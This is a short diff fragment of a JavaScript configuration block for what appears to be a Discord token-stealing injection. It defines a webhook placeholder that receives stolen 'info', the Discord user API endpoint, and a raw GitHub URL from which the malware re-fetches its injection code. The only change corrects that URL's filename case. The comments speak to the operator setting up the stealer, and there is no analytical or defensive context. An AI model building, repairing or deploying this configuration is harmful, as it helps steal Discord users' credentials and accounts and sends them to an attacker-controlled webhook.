@@ -12,7 +12,7 @@ const config = {
   embed_icon:"https://cdn.discordapp.com/avatars/777449557876277249/3929b0c854272fb4e3d5575f90254b72.png?size=1024", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5576300, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
-  injection_url: "https://raw.githubusercontent.com/xrevix/injection/main/Injection.js", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/xrevix/injection/main/injection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
